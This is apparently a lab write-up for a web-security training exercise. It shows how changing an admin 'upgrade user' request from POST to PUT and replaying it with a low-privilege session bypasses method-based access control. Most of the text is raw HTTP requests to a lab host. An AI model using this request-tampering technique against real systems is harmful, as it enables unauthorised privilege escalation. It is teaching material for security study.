## Method-based access control can be circumvented

This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.

To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.

## Notes

- /admin
- /login


## Resume

1. Login with administrator:admin
2. Capture a **Upgrade user** request
3. Log off and login with wiener:peter
4. Send **PUT** request on **Upgrade user** with wiener cookies


## Solve 

First, log in with administrator:admin to see what the admin portal look like and capture a **POST** request on **Upgrade user** aftre we get the request, downgrade the account : 

```
POST /admin-roles HTTP/2
Host: 0aaa00b004fb420082350657000f007b.web-security-academy.net
Cookie: session=avBfDKMcNcN44Mlm87Nf2rGvLmWeXe3k
Content-Length: 32
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Origin: https://0aaa00b004fb420082350657000f007b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aaa00b004fb420082350657000f007b.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


username=wiener&action=upgrade
```

Log off then access to wiener account and update the previous request with the session cookies : 

```
POST /admin-roles HTTP/2
Host: 0aaa00b004fb420082350657000f007b.web-security-academy.net
Cookie: session=avBfDKMcNcN44Mlm87Nf2rGvLmWeXe3k
Content-Length: 32
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Origin: https://0aaa00b004fb420082350657000f007b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aaa00b004fb420082350657000f007b.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


username=wiener&action=upgrade
```

Then update the **POST** to a **PUT** request : 

```
PUT /admin-roles HTTP/2
Host: 0aaa00b004fb420082350657000f007b.web-security-academy.net
Cookie: session=avBfDKMcNcN44Mlm87Nf2rGvLmWeXe3k
Content-Length: 32
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Origin: https://0aaa00b004fb420082350657000f007b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aaa00b004fb420082350657000f007b.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


username=wiener&action=upgrade
```